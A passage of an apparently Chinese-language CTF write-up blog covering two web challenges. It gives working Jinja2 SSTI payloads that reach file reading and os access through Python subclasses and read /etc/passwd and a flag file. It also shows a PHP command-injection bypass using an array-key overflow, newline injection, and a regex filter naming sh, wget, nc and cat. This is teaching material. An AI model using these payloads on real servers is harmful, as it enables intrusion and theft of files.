class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">Macro</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">Undefined</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">numbers</span>.<span class="hljs-title">Number</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">Decimal</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">_ContextManager</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">Context</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">_WorkRep</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">decimal</span>.<span class="hljs-title">_Log10Memoize</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ast</span>.<span class="hljs-title">AST</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">lexer</span>.<span class="hljs-title">Failure</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">lexer</span>.<span class="hljs-title">TokenStreamIterator</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">lexer</span>.<span class="hljs-title">TokenStream</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">lexer</span>.<span class="hljs-title">Lexer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">Parser</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">visitor</span>.<span class="hljs-title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">idtracking</span>.<span class="hljs-title">Symbols</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">compiler</span>.<span class="hljs-title">MacroRef</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">compiler</span>.<span class="hljs-title">Frame</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">Template</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">TemplateModule</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">TemplateExpression</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">environment</span>.<span class="hljs-title">TemplateStream</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">loaders</span>.<span class="hljs-title">BaseLoader</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_io</span>.<span class="hljs-title">_IOBase</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_io</span>.<span class="hljs-title">IncrementalNewlineDecoder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">bccache</span>.<span class="hljs-title">Bucket</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">bccache</span>.<span class="hljs-title">BytecodeCache</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">LogRecord</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">Formatter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">BufferingFormatter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">Filter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">Filterer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">PlaceHolder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">Manager</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">logging</span>.<span class="hljs-title">LoggerAdapter</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">datetime</span>.<span class="hljs-title">date</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">datetime</span>.<span class="hljs-title">timedelta</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">datetime</span>.<span class="hljs-title">time</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">datetime</span>.<span class="hljs-title">tzinfo</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">_internal</span>.<span class="hljs-title">_Missing</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">_internal</span>.<span class="hljs-title">_DictAccessorProperty</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ImmutableListMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ImmutableDictMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">UpdateDictMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ViewItems</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">_omd_bucket</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">Headers</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ImmutableHeadersMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">IfRange</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">Range</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">ContentRange</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">datastructures</span>.<span class="hljs-title">FileStorage</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">email</span>.<span class="hljs-title">LazyImporter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">calendar</span>.<span class="hljs-title">Calendar</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">urls</span>.<span class="hljs-title">Href</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">HTMLBuilder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">accept</span>.<span class="hljs-title">AcceptMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">auth</span>.<span class="hljs-title">AuthorizationMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">auth</span>.<span class="hljs-title">WWWAuthenticateMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wsgi</span>.<span class="hljs-title">ClosingIterator</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wsgi</span>.<span class="hljs-title">FileWrapper</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wsgi</span>.<span class="hljs-title">_RangeWrapper</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">middleware</span>.<span class="hljs-title">dispatcher</span>.<span class="hljs-title">DispatcherMiddleware</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">middleware</span>.<span class="hljs-title">http_proxy</span>.<span class="hljs-title">ProxyMiddleware</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">middleware</span>.<span class="hljs-title">shared_data</span>.<span class="hljs-title">SharedDataMiddleware</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">formparser</span>.<span class="hljs-title">FormDataParser</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">formparser</span>.<span class="hljs-title">MultiPartParser</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">base_request</span>.<span class="hljs-title">BaseRequest</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">base_response</span>.<span class="hljs-title">BaseResponse</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">common_descriptors</span>.<span class="hljs-title">CommonRequestDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">common_descriptors</span>.<span class="hljs-title">CommonResponseDescriptorsMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">etag</span>.<span class="hljs-title">ETagRequestMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">etag</span>.<span class="hljs-title">ETagResponseMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">user_agent</span>.<span class="hljs-title">UserAgentMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">request</span>.<span class="hljs-title">StreamOnlyMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">response</span>.<span class="hljs-title">ResponseStream</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">response</span>.<span class="hljs-title">ResponseStreamMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">exceptions</span>.<span class="hljs-title">Aborter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">uuid</span>.<span class="hljs-title">UUID</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">CArgObject</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ctypes</span>.<span class="hljs-title">CThunkObject</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ctypes</span>.<span class="hljs-title">_CData</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ctypes</span>.<span class="hljs-title">CField</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">_ctypes</span>.<span class="hljs-title">DictRemover</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">ctypes</span>.<span class="hljs-title">CDLL</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">ctypes</span>.<span class="hljs-title">LibraryLoader</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">select</span>.<span class="hljs-title">epoll</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">subprocess</span>.<span class="hljs-title">Popen</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">_json</span>.<span class="hljs-title">_CompactJSON</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">signer</span>.<span class="hljs-title">SigningAlgorithm</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">signer</span>.<span class="hljs-title">Signer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">serializer</span>.<span class="hljs-title">Serializer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">itsdangerous</span>.<span class="hljs-title">url_safe</span>.<span class="hljs-title">URLSafeSerializerMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">_compat</span>.<span class="hljs-title">_DeprecatedBool</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">local</span>.<span class="hljs-title">Local</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">local</span>.<span class="hljs-title">LocalStack</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">local</span>.<span class="hljs-title">LocalManager</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">local</span>.<span class="hljs-title">LocalProxy</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">ast</span>.<span class="hljs-title">NodeVisitor</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">difflib</span>.<span class="hljs-title">HtmlDiff</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">RuleFactory</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">RuleTemplate</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">BaseConverter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">Map</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">routing</span>.<span class="hljs-title">MapAdapter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">_compat</span>.<span class="hljs-title">_FixupStream</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">_compat</span>.<span class="hljs-title">_AtomicFile</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">LazyFile</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">KeepOpenFile</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">utils</span>.<span class="hljs-title">PacifyFlushWrapper</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">types</span>.<span class="hljs-title">ParamType</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">Option</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">Argument</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">ParsingState</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">parser</span>.<span class="hljs-title">OptionParser</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">formatting</span>.<span class="hljs-title">HelpFormatter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">core</span>.<span class="hljs-title">Context</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">core</span>.<span class="hljs-title">BaseCommand</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">click</span>.<span class="hljs-title">core</span>.<span class="hljs-title">Parameter</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">signals</span>.<span class="hljs-title">Namespace</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">signals</span>.<span class="hljs-title">_FakeSignal</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">helpers</span>.<span class="hljs-title">locked_cached_property</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">helpers</span>.<span class="hljs-title">_PackageBoundObject</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">cli</span>.<span class="hljs-title">DispatchingApp</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">cli</span>.<span class="hljs-title">ScriptInfo</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">config</span>.<span class="hljs-title">ConfigAttribute</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">ctx</span>.<span class="hljs-title">_AppCtxGlobals</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">ctx</span>.<span class="hljs-title">AppContext</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">ctx</span>.<span class="hljs-title">RequestContext</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">json</span>.<span class="hljs-title">tag</span>.<span class="hljs-title">JSONTag</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">json</span>.<span class="hljs-title">tag</span>.<span class="hljs-title">TaggedJSONSerializer</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">sessions</span>.<span class="hljs-title">SessionInterface</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">json</span>.<span class="hljs-title">_JSONModule</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">wrappers</span>.<span class="hljs-title">json</span>.<span class="hljs-title">JSONMixin</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">flask</span>.<span class="hljs-title">blueprints</span>.<span class="hljs-title">BlueprintSetupState</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">serving</span>.<span class="hljs-title">WSGIRequestHandler</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">ext</span>.<span class="hljs-title">Extension</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">ext</span>.<span class="hljs-title">_CommentFinder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">serving</span>.<span class="hljs-title">_SSLContext</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">serving</span>.<span class="hljs-title">BaseWSGIServer</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">unicodedata</span>.<span class="hljs-title">UCD</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">array</span>.<span class="hljs-title">array</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">debug</span>.<span class="hljs-title">TracebackFrameProxy</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">jinja2</span>.<span class="hljs-title">debug</span>.<span class="hljs-title">ProcessedTraceback</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">test</span>.<span class="hljs-title">_TestCookieHeaders</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">test</span>.<span class="hljs-title">_TestCookieResponse</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">test</span>.<span class="hljs-title">EnvironBuilder</span>&#x27;&gt;, &lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">werkzeug</span>.<span class="hljs-title">test</span>.<span class="hljs-title">Client</span>&#x27;&gt;, &lt;<span class="hljs-title">type</span> &#x27;<span class="hljs-title">method</span>-<span class="hljs-title">wrapper</span>&#x27;&gt;]</span><br></code></pre></td></tr></table></figure>



<p><strong>可以看到有一个type file类型(可以进行文件读取)</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; [].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;<br></code></pre></td></tr></table></figure>

<p>webflask4](D:\blog\pict\webflask4.png</p>
<p><strong>可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].listdir(<span class="hljs-string">&#x27;.&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>D:\blog\pict\webflask5.png</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;fl4g&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="2-favorit-number"><a href="#2-favorit-number" class="headerlink" title="2.favorit_number"></a>2.favorit_number</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//php5.5.9</span><br><span class="hljs-variable">$stuff</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;stuff&quot;</span>];<br><span class="hljs-variable">$array</span> = [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$stuff</span> === <span class="hljs-variable">$array</span> &amp;&amp; <span class="hljs-variable">$stuff</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;  <span class="hljs-comment">#此处可用php5.5.9数组绕过，数组中键值为0的元素与键值为4294967296 //0x100000000 的元素是同一个</span><br>    <span class="hljs-variable">$num</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/^\d+$/im&quot;</span>,<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="hljs-variable">$num</span>))&#123;       <span class="hljs-comment">//这里进行了一个过滤，可以使用打开文件inum的方法</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;my favorite num is:&quot;</span>;                 <span class="hljs-comment">//以及%0a截断</span><br>            system(<span class="hljs-string">&quot;echo &quot;</span>.<span class="hljs-variable">$num</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Bonjour!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#数组中键值为0的元素与键值为4294967296 //0x100000000 的元素是同一个</span><br></code></pre></td></tr></table></figure>

<p>D:\blog\pict\favonum1.png</p>
<p>所以绕过第一个if就需要构造stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123,成功绕过</p>
<p>D:\blog\pict\favonum2.png</p>
<p>在num处执行命令ls ./</p>
<p>D:\blog\pict\favonum3.png</p>
<p>ls ../../../../</p>
<p>D:\blog\pict\favonum4.png</p>
<p>ls / -i</p>
<p>D:\blog\pict\favonum5.png</p>
<p>tac <code>find / -inum=7342887</code></p>
<p>D:\blog\pict\favonum6.png</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
